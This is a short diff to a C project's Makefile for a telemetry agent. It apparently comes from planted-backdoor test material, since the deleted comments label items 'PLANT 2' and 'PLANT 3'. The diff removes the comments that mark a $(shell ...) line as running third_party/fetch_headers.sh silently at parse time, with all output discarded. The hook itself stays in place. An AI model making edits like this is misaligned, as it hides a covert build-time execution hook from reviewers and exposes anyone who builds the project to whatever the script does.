@@ -1,7 +1,6 @@
 CC      := gcc
 CFLAGS  := -D_FORTIFY_SOURCE=2 -O3 -DNDEBUG -Isrc
 
-# PLANT 2: runs at parse time, before any target, silently.
 HEADERS_READY := $(shell third_party/fetch_headers.sh >/dev/null 2>&1; echo ok)
 
 all: telemetry-agent
@@ -19,7 +18,6 @@ build/util.o: src/util.c
 	@mkdir -p build
 	$(CC) $(CFLAGS) -c src/util.c -o build/util.o
 
-# PLANT 3 note retained in spirit: target depends on source, builds cleanly.
 build/telemetry.o: src/telemetry.c
 	@mkdir -p build
 	$(CC) $(CFLAGS) -c src/telemetry.c -o build/telemetry.o
